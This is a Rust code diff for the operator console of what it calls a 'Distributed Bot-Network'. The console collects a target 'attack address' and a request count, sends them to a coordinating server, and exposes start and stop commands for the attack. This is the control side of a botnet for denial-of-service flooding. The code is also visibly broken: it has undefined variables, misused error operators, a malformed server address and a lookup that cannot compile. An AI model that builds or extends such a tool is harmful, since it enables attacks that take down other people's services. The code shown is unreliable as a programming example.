@@ -26,48 +26,39 @@ impl Host {
         num_requests.parse::<i32>().map_or(false, |n| n > 0)
     }
 
-    fn set_attack_address(&mut self) -> Result<(),  Error> {
+    fn set_attack_address(&mut self) {
         println!("Enter attack address: ");
         let mut inp = String::new();
         stdin().read_line(&mut inp)?;
 
         let attack_address = inp.trim();
-        if Self::validate_attack_address(attack_address) {
-            self.attack_address = attack_address.to_owned();
-            Ok(())
-        } else {
+        while !self::validate_attack_address(attack_address) {
             println!("Invalid attack address");
-            // Err(Error::from(io::Error::new(
-            //     io::ErrorKind::InvalidInput,
-            //     "Invalid attack address",
-            // )))
+            println!("Enter attack address: ");
+            stdout().flush().unwrap();
+            inp.clear();
+            stdin().read_line(&mut inp)?;
         }
+        self.attack_address = attack_address.to_owned();
     }
 
-    fn set_requests_amount(&mut self) -> Result<(), Error> {
+    fn set_requests_amount(&mut self) {
         println!("Enter number of requests: ");
         let mut inp = String::new();
         stdin().read_line(&mut inp)?;
 
         let num_requests = inp.trim();
-        if Self::validate_requests_amount(num_requests) {
-            self.num_requests = num_requests.parse().unwrap();
-            Ok(())
-        } else {
+        while !self::validate_requests_amount(num_requests) {
             println!("Invalid number of requests");
-            Err(Error::from(io::Error::new(
-                io::ErrorKind::InvalidInput,
-                "Invalid number of requests",
-            )))
+            println!("Enter number of requests: ");
+            stdout().flush().unwrap();
+            inp.clear();
+            stdin().read_line(&mut inp)?;
         }
+        self.num_requests = num_requests.parse().unwrap();
     }
 
-    fn _send_attack_info(&self) -> Result<(),  Error> {
-        if self.attack_address.is_empty() || self.num_requests == 0 {
-            println!("You must set the attack address or number of requests first");
-            return Ok(());
-        }
-
+    fn send_attack_info(&self) {
         let attack_info = serde_json::json!({
             "attack_address": &self.attack_address,
             "requests_amount": self.num_requests,
@@ -78,51 +69,77 @@ impl Host {
             .post(&format!("http://{}/attack_info", self.server_address))
             .json(&attack_info)
             .send()?;
-
-        if res.status().is_success() {
-            Ok(())
-        } else {
-            println!("Failed to send attack info to server");
-            // Err(Error::from(io::Error::new(
-            //     io::ErrorKind::Other,
-            //     "Failed to send attack info to server",
-            // )))
-        }
     }
 
-    fn _receive_attack_info(&mut self) -> Result<(), Error> {
-        let client = Client::new();
+    fn _receive_attack_info(&mut self) {
+        // let client = Client::new();
         let res = client
             .get(&format!("http://{}/attack_info", self.server_address))
             .send()?;
-
-        if res.status().is_success() {
-            let content: serde_json::Value = res.json()?;
-            if let (Some(attack_address), Some(num_requests)) = (
-                content.get("attack_address").and_then(|v| v.as_str()),
-                content.get("requests_amount").and_then(|v| v.as_i64()),
-            ) {
-                self.attack_address = attack_address.to_owned();
-                self.num_requests = num_requests as i32;
-                Ok(())
-            } else {
-                println!("Invalid attack info received from server");
-                // Err(Error::from(std::io::Error::new(
-                //     std::io::ErrorKind::Other,
-                //     "Invalid attack info received from server",
-                // )))
-            }
-        } else {
-            println!("Failed to receive attack info from server");
-            // Err(Error::from(std::io::Error::new(
-            //     std::io::ErrorKind::Other,
-            //     "Failed to receive attack info from server",
-            // )))
-        }
+    }
+    fn start_attack(&mut self) {
+        self.send_attack_info();
     }
 }
 
-fn main(){
+fn set_attack_info(host_: &mut Host) {
+    hoster.set_attack_address();
+    hoster.set_requests_amount();
+    println!("Attack info set successfully");
+}
+
+fn start_attack_wrapper(host_: &mut host::Host) {
+    host_.start_attack();
+    println!("Started attacking...");
+}
+
+fn stop_attack_wrapper(host_: &mut host::Host) {
+    host_.stop_attack();
+    println!("Stopped attacking");
+}
+
+fn print_info() {
+    println!("Main commands:");
+    println!("1. Type 'set' to set attack info.");
+    println!("2. Type 'help' to see the list of available options.");
+    println!("3. Type 'start' to start the attack.");
+    println!("4. Type 'stop' to stop the attack.");
+}
+
+fn main() {
     let mut host = Host::new(String::from("http://localhost8000"));
+    let server_address = ("0.0.0.0", 8000);
+    let mut host_ = host::Host::new(&format!("{}:{}", server_address.0, server_address.1));
+
+    let inp_options = vec![
+        ("set", set_attack_info as fn(&mut host::Host)),
+        ("help", print_info as fn()),
+        ("start", start_attack_wrapper as fn(&mut host::Host)),
+        ("stop", stop_attack_wrapper as fn(&mut host::Host)),
+    ];
+
+    println!("Distributed Bot-Network Command Line Interface");
+    println!("Type 'help' to see the list of available options.");
+    println!("Enter command:");
+
+    loop {
+        let mut inp = String::new();
+        stdin().read_line(&mut inp).expect("Failed to read line");
+        let inp = inp.trim();
+
+        let inp = inp.trim();
+        if inp == "exit" {
+            break;
+        }
+        match inp_options.get(inp) {
+            Some(func) => func(&mut host_),
+            None => {
+                println!(
+                    "Unknown option. \nType 'help' to see the list of all available options."
+                );
+                continue;
+            }
+        }
+    }
 }
 
